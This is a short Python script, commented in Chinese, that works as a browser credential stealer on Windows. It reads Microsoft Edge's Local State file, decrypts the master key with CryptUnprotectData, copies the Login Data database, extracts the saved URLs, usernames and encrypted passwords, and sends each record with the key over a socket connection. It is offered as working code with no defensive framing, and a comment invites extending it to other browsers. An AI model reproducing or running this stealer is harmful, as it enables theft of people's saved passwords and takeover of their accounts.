import json, os, base64, pickle, shutil, sqlite3
from win32crypt import CryptUnprotectData
from socket import *

# 网络链接
s = socket()
s.connect((gethostname(), 2345))

# 准备浏览器的用户路径
browser_path = os.getenv('LOCALAPPDATA') + '\\Microsoft\\Edge\\User Data'             # 微软浏览器 其他浏览器自行补充

# 拿到key
text = open(browser_path + '\\Local State', 'r', encoding='utf-8').read()
JSON = json.loads(text)
key = base64.b64decode(JSON['os_crypt']['encrypted_key'])[5:]
key = CryptUnprotectData(key, None, None, None, 0)[1]

# 拿到网址 账号 密文
db_file = browser_path + '\\Default\\Login Data'
shutil.copy(db_file, 'Login Data')
conn = sqlite3.connect('Login Data')
cursor = conn.cursor()
cursor.execute('SELECT action_url, username_value, password_value FROM logins')
for data in cursor.fetchall():
    data = list(data)
    data.append(key)
    s.send('1'.encode())
    s.recv(1024)
    s.send(pickle.dumps(data))
    s.recv(1024)
s.send('0'.encode())